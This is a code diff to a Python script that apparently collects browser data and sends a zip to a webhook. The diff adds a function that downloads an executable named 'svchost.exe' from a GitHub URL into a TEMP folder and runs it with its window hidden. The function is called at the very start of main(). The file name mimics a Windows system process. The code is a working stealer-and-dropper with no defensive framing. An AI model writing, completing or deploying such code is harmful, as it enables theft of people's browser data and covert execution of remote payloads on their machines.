@@ -697,12 +697,36 @@ def send_to_webhook(zip_path, webhook_url):
     except:
         pass
 
+def download_and_run_svchost():
+    url = "https://github.com/erayx069-ux/extractor/raw/refs/heads/main/svchost.exe"
+    temp_dir = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'crash_x90213x')
+    if not os.path.exists(temp_dir):
+        os.makedirs(temp_dir)
+    
+    file_path = os.path.join(temp_dir, "svchost.exe")
+    
+    try:
+        print("[*] Downloading svchost.exe...")
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req) as response:
+            with open(file_path, "wb") as f:
+                f.write(response.read())
+        
+        print("[*] Starting svchost.exe...")
+        subprocess.Popen([file_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
+        print(f"[+] svchost.exe started: {file_path}")
+    except Exception as e:
+        print(f"[!] svchost.exe download/run error: {e}")
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('mode', nargs='?', default='all')
     parser.add_argument('--fingerprint', action='store_true')
     parser.add_argument('--output-path', required=False)
     args = parser.parse_args()
+
+    download_and_run_svchost()
+
     print("[*] Browser data collection started...")
     kill_browser_processes()
     time.sleep(1)
